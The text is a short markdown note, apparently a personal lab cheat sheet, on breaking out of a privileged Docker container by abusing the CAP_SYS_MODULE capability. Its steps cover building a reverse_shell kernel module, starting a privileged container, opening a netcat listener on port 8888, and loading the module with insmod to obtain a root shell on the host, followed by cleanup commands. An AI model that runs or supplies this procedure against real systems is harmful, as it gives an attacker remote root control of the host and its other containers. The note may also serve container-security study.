# Linux system module abuse

- imapct
    - reverse host root shell

- Breakout Privileged
    - all
    - actually cap_sys_module

- change reverse_shell.c ip address(ip addr (apt-get install iproute2))

- action
    
    (on host)
    - make 
    - docker run -it --privileged ubuntu:22.04 bash
    - docker cp reverse_shell.ko 2398764aw2:/
    - nc -nvlp 8888 (apt-get install netcat)
    - insmod reverse_shell.ko (apt-get install kmod)


- recovery command
    - make clean
    - rmmod reverse_shell